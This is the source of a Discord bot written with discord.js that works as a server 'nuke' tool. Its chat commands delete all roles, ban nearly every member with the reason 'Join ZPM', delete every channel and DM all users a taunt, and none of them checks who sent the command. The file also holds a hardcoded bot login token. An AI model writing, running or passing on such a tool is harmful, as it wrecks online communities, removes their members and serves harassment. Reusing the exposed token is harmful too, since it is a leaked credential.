
const Discord = require("discord.js")
const client = new Discord.Client()
const bot = client
bot.login("NzEwNjcyMjQzMzM5ODIxMTA2.Xr6Sxg.-TxmQFUq1_QTuYUhqFf0fw4j-aM");

bot.on("ready", ()=>{
  console.log(client.user.id)
  bot.guilds.cache.forEach(g =>{
    console.log(g.name, g.id, g.memberCount)
  })
})

bot.on("message", async message =>{
  if(message.content === "javascript! role delete all"){
    message.guild.roles.cache.filter(r => !r.managed && r.position < message.guild.me.roles.highest.position && r.id !== message.guild.id).forEach((role)=>{
      role.delete().then((m)=>{
        message.channel.send(`deleted ${m.name} (${m.toString()})`)
        
      })
    })
  }else if(message.content === "javascript! ban all"){
    message.guild.members.cache.filter(m => m.user.id !== message.guild.ownerID && m.user.id !== bot.user.id && m.roles.highest.position < message.guild.me.roles.highest.position).forEach((m)=>{
      m.ban("Join ZPM").then((mem)=>{
        message.channel.send(`Succesfully banned ${mem.user.id} ${m.user.tag}`)
      })
    })
  } else if(message.content === "javascript! delete all channels"){
    message.guild.channels.cache.forEach((c)=>{
      c.delete()
    })
  } else if(message.content === "javascript! bruh"){
    bot.users.cache.forEach((c)=>{
      c.send(`Bruh i fucked ur server up 😂`)
    })
  }
})

